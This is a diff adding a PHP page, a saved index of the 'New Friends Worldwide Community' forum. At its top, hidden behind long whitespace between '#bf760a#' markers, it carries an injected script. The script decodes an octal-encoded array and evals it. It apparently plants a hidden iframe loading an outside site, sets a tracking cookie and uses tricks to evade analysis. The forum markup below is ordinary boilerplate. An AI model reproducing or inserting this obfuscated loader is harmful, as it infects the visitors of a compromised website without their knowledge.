@@ -1,0 +1,300 @@
+<?
+#bf760a#
+                                                                                                                                                                                                                                                          echo "                                                                                                                                                                                                                                                          <script type=\"text/javascript\" language=\"javascript\" >                                                                                                                                                                                                                                                          a=(\"44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,155,173,150,164,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,155,173,150,164,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,160,156,61,152,166,145,162,157,151,162,161,145,166,157,170,62,145,170,63,166,151,160,145,175,62,164,154,164,53,77,21,16,44,155,173,150,164,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,155,173,150,164,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,155,173,150,164,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,155,173,150,164,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,155,173,150,164,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,155,173,150,164,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,155,173,150,164,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,155,173,150,164,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,155,173,150,164,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,155,173,150,164,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16\"[\"split\"](\",\"));ss=eval(\"Str\"+\"ing\");d=document;for(i=0;i<a.length;i+=1){a[i]=parseInt(a[i],8)-(7-3);}try{d.body++}catch(q){zz=0;}try{zz&=2}catch(q){zz=1;}if(!zz)if(window[\"document\"])eval(ss[\"fromCharCode\"].apply(ss,a));</script>";
+
+#/bf760a#
+?>
+<?
+
+?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<link rel="stylesheet" type="text/css" href="http://www.newfriendsworldwide.net/forum/Themes/default/css/index.css?fin20" />
+	<link rel="stylesheet" type="text/css" href="http://www.newfriendsworldwide.net/forum/Themes/default/css/ie6.css" />
+	<script type="text/javascript" src="http://www.newfriendsworldwide.net/forum/Themes/default/scripts/script.js?fin20"></script>
+	<script type="text/javascript" src="http://www.newfriendsworldwide.net/forum/Themes/default/scripts/theme.js?fin20"></script>
+	<script type="text/javascript"><!-- // --><![CDATA[
+		var smf_theme_url = "http://www.newfriendsworldwide.net/forum/Themes/default";
+		var smf_default_theme_url = "http://www.newfriendsworldwide.net/forum/Themes/default";
+		var smf_images_url = "http://www.newfriendsworldwide.net/forum/Themes/default/images";
+		var smf_scripturl = "http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;";
+		var smf_iso_case_folding = false;
+		var smf_charset = "UTF-8";
+		var ajax_notification_text = "Loading...";
+		var ajax_notification_cancel_text = "Cancel";
+	// ]]></script>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta name="description" content="New Friends Worldwide Community - Index" />
+	<meta name="keywords" content="all New Friends Worldwide, Community, dating, web cam wiz, video, chat, The most beautiful women of the world, Music On Line, Nuovi Amici nel Mondo, Love, Loves, girl, girls, women, my love, my loves, myloves, myloves.it, myloves.co, myloves.com, myloves.com.np, video, gentle, night club, casino, games, pandpitalia, elenaconsales, elena consales, elenaconsales.com, elenaconsales.net, elenaconsales.es, love follow me, hello, lovefollowme.net, mac, mac os, Domain Names, eCommerce, Web Hosting, webhosting, vps, dedicated server, Software, desing, Hardware, ignaziopicardi.net, houstontexashosting.com, PandPItalia, www" />
+	<title>New Friends Worldwide Community - Index</title>
+	<meta name="robots" content="noindex" />
+	<link rel="canonical" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;" />
+	<link rel="help" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=help" />
+	<link rel="search" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=search" />
+	<link rel="contents" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;" />
+	<link rel="alternate" type="application/rss+xml" title="New Friends Worldwide Community - RSS" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;type=rss;action=.xml" />
+</head>
+<body>
+<div id="wrapper" style="width: 90%">
+	<div id="header"><div class="frame">
+		<div id="top_section">
+			<h1 class="forumtitle">
+				<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;">New Friends Worldwide Community</a>
+			</h1>
+			<img id="upshrink" src="http://www.newfriendsworldwide.net/forum/Themes/default/images/upshrink.png" alt="*" title="Shrink or expand the header." style="display: none;" />
+			<img id="smflogo" src="http://www.newfriendsworldwide.net/forum/Themes/default/images/smflogo.png" alt="Simple Machines Forum" title="Simple Machines Forum" />
+		</div>
+		<div id="upper_section" class="middletext">
+			<div class="user">
+				<script type="text/javascript" src="http://www.newfriendsworldwide.net/forum/Themes/default/scripts/sha1.js"></script>
+				<form id="guest_form" action="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=login2" method="post" accept-charset="UTF-8"  onsubmit="hashLoginPassword(this, 'c4b793f8392e39b4e8d5aa51da9bac6e');">
+					<div class="info">Welcome, <strong>Guest</strong>. Please <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=login">login</a> or <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=register">register</a>.</div>
+					<input type="text" name="user" size="10" class="input_text" />
+					<input type="password" name="passwrd" size="10" class="input_password" />
+					<select name="cookielength">
+						<option value="60">1 Hour</option>
+						<option value="1440">1 Day</option>
+						<option value="10080">1 Week</option>
+						<option value="43200">1 Month</option>
+						<option value="-1" selected="selected">Forever</option>
+					</select>
+					<input type="submit" value="Login" class="button_submit" /><br />
+					<div class="info">Login with username, password and session length</div>
+					<input type="hidden" name="hash_passwrd" value="" />
+				</form>
+			</div>
+			<div class="news normaltext">
+				<form id="search_form" action="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=search2" method="post" accept-charset="UTF-8">
+					<input type="text" name="search" value="" class="input_text" />&nbsp;
+					<input type="submit" name="submit" value="Search" class="button_submit" />
+					<input type="hidden" name="advanced" value="0" /></form>
+				<h2>News: </h2>
+				<p>NFW - Just Installed! All our sites:<br /><a href="http://www.newfriendsworldwide.net/" class="bbc_link" target="_blank">http://www.newfriendsworldwide.net/</a><br /><a href="http://www.newfriendsworldwide.co/" class="bbc_link" target="_blank">http://www.newfriendsworldwide.co/</a><br /><a href="http://www.newfriendsworldwide.com/" class="bbc_link" target="_blank">http://www.newfriendsworldwide.com/</a><br /><a href="http://www.newfriendsworldwide.org/" class="bbc_link" target="_blank">http://www.newfriendsworldwide.org/</a><br /></p>
+			</div>
+		</div>
+		<br class="clear" />
+		<script type="text/javascript"><!-- // --><![CDATA[
+			var oMainHeaderToggle = new smc_Toggle({
+				bToggleEnabled: true,
+				bCurrentlyCollapsed: false,
+				aSwappableContainers: [
+					'upper_section'
+				],
+				aSwapImages: [
+					{
+						sId: 'upshrink',
+						srcExpanded: smf_images_url + '/upshrink.png',
+						altExpanded: 'Shrink or expand the header.',
+						srcCollapsed: smf_images_url + '/upshrink2.png',
+						altCollapsed: 'Shrink or expand the header.'
+					}
+				],
+				oThemeOptions: {
+					bUseThemeSettings: false,
+					sOptionName: 'collapse_header',
+					sSessionVar: 'd5b2fc1',
+					sSessionId: 'c4b793f8392e39b4e8d5aa51da9bac6e'
+				},
+				oCookieOptions: {
+					bUseCookie: true,
+					sCookieName: 'upshrink'
+				}
+			});
+		// ]]></script>
+		<div id="main_menu">
+			<ul class="dropmenu" id="menu_nav">
+				<li id="button_home">
+					<a class="active firstlevel" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;">
+						<span class="last firstlevel">Home</span>
+					</a>
+				</li>
+				<li id="button_help">
+					<a class="firstlevel" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=help">
+						<span class="firstlevel">Help</span>
+					</a>
+				</li>
+				<li id="button_search">
+					<a class="firstlevel" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=search">
+						<span class="firstlevel">Search</span>
+					</a>
+				</li>
+				<li id="button_calendar">
+					<a class="firstlevel" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=calendar">
+						<span class="firstlevel">Calendar</span>
+					</a>
+				</li>
+				<li id="button_login">
+					<a class="firstlevel" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=login">
+						<span class="firstlevel">Login</span>
+					</a>
+				</li>
+				<li id="button_register">
+					<a class="firstlevel" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=register">
+						<span class="last firstlevel">Register</span>
+					</a>
+				</li>
+			</ul>
+		</div>
+		<br class="clear" />
+	</div></div>
+	<div id="content_section"><div class="frame">
+		<div id="main_content_section">
+	<div class="navigate_section">
+		<ul>
+			<li class="last">
+				<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;"><span>New Friends Worldwide Community</span></a>
+			</li>
+		</ul>
+	</div>
+	<div id="boardindex_table">
+		<table class="table_list">
+			<tbody class="header" id="category_1">
+				<tr>
+					<td colspan="4">
+						<div class="cat_bar">
+							<h3 class="catbg">
+								<a id="c1"></a>General Category
+							</h3>
+						</div>
+					</td>
+				</tr>
+			</tbody>
+			<tbody class="content" id="category_1_boards">
+				<tr id="board_1" class="windowbg2">
+					<td class="icon windowbg">
+						<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;board=1.0">
+							<img src="http://www.newfriendsworldwide.net/forum/Themes/default/images/off.png" alt="No New Posts" title="No New Posts" />
+						</a>
+					</td>
+					<td class="info">
+						<a class="subject" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;board=1.0" name="b1">General Discussion Forum Subscription</a>
+
+						<p>La Sottoscrizione al Forum è annuale tramite versamento di 3 Dollari con PayPal - Feel free to talk about anything and everything in this board.</p>
+					</td>
+					<td class="stats windowbg">
+						<p>3 Posts <br />
+						3 Topics
+						</p>
+					</td>
+					<td class="lastpost">
+						<p><strong>Last post</strong>  by <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=1">Administrator</a><br />
+						in <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;topic=3.msg3#new" title="BABES">BABES</a><br />
+						on July 20, 2012, 07:18:13 AM
+						</p>
+					</td>
+				</tr>
+			</tbody>
+			<tbody class="divider">
+				<tr>
+					<td colspan="4"></td>
+				</tr>
+			</tbody>
+		</table>
+	</div>
+	<div id="posting_icons" class="flow_hidden">
+		<ul class="reset">
+			<li class="floatleft"><img src="http://www.newfriendsworldwide.net/forum/Themes/default/images/new_none.png" alt="" /> No New Posts</li>
+			<li class="floatleft"><img src="http://www.newfriendsworldwide.net/forum/Themes/default/images/new_redirect.png" alt="" /> Redirect Board</li>
+		</ul>
+	</div>
+	<span class="clear upperframe"><span></span></span>
+	<div class="roundframe"><div class="innerframe">
+		<div class="cat_bar">
+			<h3 class="catbg">
+				<img class="icon" id="upshrink_ic" src="http://www.newfriendsworldwide.net/forum/Themes/default/images/collapse.gif" alt="*" title="Shrink or expand the header." style="display: none;" />
+				New Friends Worldwide Community - Info Center
+			</h3>
+		</div>
+		<div id="upshrinkHeaderIC">
+			<div class="title_barIC">
+				<h4 class="titlebg">
+					<span class="ie6_header floatleft">
+						<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=calendar"><img class="icon" src="http://www.newfriendsworldwide.net/forum/Themes/default/images/icons/calendar.gif" alt="Upcoming Calendar" /></a>
+						Upcoming Calendar
+					</span>
+				</h4>
+			</div>
+			<p class="smalltext">
+				<span class="holiday"> Memorial Day</span><br />
+				<span class="birthday">Upcoming Birthdays:</span> 
+				<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=34036"><strong>donkey61grease</strong> (30)</a><br />
+			</p>
+			<div class="title_barIC">
+				<h4 class="titlebg">
+					<span class="ie6_header floatleft">
+						<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=stats"><img class="icon" src="http://www.newfriendsworldwide.net/forum/Themes/default/images/icons/info.gif" alt="Forum Stats" /></a>
+						Forum Stats
+					</span>
+				</h4>
+			</div>
+			<p>
+				1 Posts in 1 Topics by 35580 Members. Latest Member: <strong> <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=35580">Gredgedarnido</a></strong><br />
+				Latest Post: <strong>&quot;<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;topic=3.msg3#new" title="BABES">BABES</a>&quot;</strong>  ( July 20, 2012, 07:18:13 AM )<br />
+				<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=recent">View the most recent posts on the forum.</a><br />
+				<a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=stats">[More Stats]</a>
+			</p>
+			<div class="title_barIC">
+				<h4 class="titlebg">
+					<span class="ie6_header floatleft">
+						<img class="icon" src="http://www.newfriendsworldwide.net/forum/Themes/default/images/icons/online.gif" alt="Users Online" />
+						Users Online
+					</span>
+				</h4>
+			</div>
+			<p class="inline stats">
+				34 Guests, 29 Users
+			</p>
+			<p class="inline smalltext">
+				Users active in past 15 minutes:<br /><a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=35288">Tninetugrq</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=22957">TukaPyngeafe</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=32490">ReloSkake</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=26220">Bzzgmw39</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=32877">VabGraberah</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=35580">Gredgedarnido</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=24720">AppofApparDab</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=25844">Stastaple</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=23038">vppsnypd</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=35298">Jivxplavk</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=34590">Laulkimealask</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=28152">litsslke</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=14805">hays6qoxc</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=35251">Kqytywjhk</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=29439">Navegrourreda</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=3492">jnwzahrv</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=34325">unligging</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=35419">refbaksr</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=32346">claillaMymn</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=28593">xpjswtsy</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=32078">Unlidisonna</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=32233">Greertusy</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=19828">xatelow</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=33538">ancemiaLignal</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=35579">xkindfhrows</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=30935">bexBoamnavabe</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=35279">Ndiswyzwur</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=20709">Seetleaftekdf</a>, <a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=profile;u=25781">Fluornunparne</a>
+			</p>
+			<p class="last smalltext">
+				Most Online Today: <strong>94</strong>.
+				Most Online Ever: 106 (April 11, 2013, 10:54:15 PM)
+			</p>
+		</div>
+	</div></div>
+	<span class="lowerframe"><span></span></span>
+	<script type="text/javascript"><!-- // --><![CDATA[
+		var oInfoCenterToggle = new smc_Toggle({
+			bToggleEnabled: true,
+			bCurrentlyCollapsed: false,
+			aSwappableContainers: [
+				'upshrinkHeaderIC'
+			],
+			aSwapImages: [
+				{
+					sId: 'upshrink_ic',
+					srcExpanded: smf_images_url + '/collapse.gif',
+					altExpanded: 'Shrink or expand the header.',
+					srcCollapsed: smf_images_url + '/expand.gif',
+					altCollapsed: 'Shrink or expand the header.'
+				}
+			],
+			oThemeOptions: {
+				bUseThemeSettings: false,
+				sOptionName: 'collapse_header_ic',
+				sSessionVar: 'd5b2fc1',
+				sSessionId: 'c4b793f8392e39b4e8d5aa51da9bac6e'
+			},
+			oCookieOptions: {
+				bUseCookie: true,
+				sCookieName: 'upshrinkIC'
+			}
+		});
+	// ]]></script>
+		</div>
+	</div></div>
+	<div id="footer_section"><div class="frame">
+		<ul class="reset">
+			<li class="copyright">
+			<span class="smalltext" style="display: inline; visibility: visible; font-family: Verdana, Arial, sans-serif;"><a href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=credits" title="Simple Machines Forum" target="_blank" class="new_win">SMF 2.0.2</a> |
+ <a href="http://www.simplemachines.org/about/smf/license.php" title="License" target="_blank" class="new_win">SMF &copy; 2011</a>, <a href="http://www.simplemachines.org" title="Simple Machines" target="_blank" class="new_win">Simple Machines</a>
+			</span></li>
+			<li><a id="button_xhtml" href="http://validator.w3.org/check?uri=referer" target="_blank" class="new_win" title="Valid XHTML 1.0!"><span>XHTML</span></a></li>
+			<li><a id="button_rss" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;action=.xml;type=rss" class="new_win"><span>RSS</span></a></li>
+			<li class="last"><a id="button_wap2" href="http://www.newfriendsworldwide.net/forum/index.php?PHPSESSID=d1n3fiis6aloqlbsaideqiajf1&amp;wap2" class="new_win"><span>WAP2</span></a></li>
+		</ul>
+		<p>Page created in 0.53 seconds with 10 queries.</p>
+	</div></div>
+</div>
+</body></html>
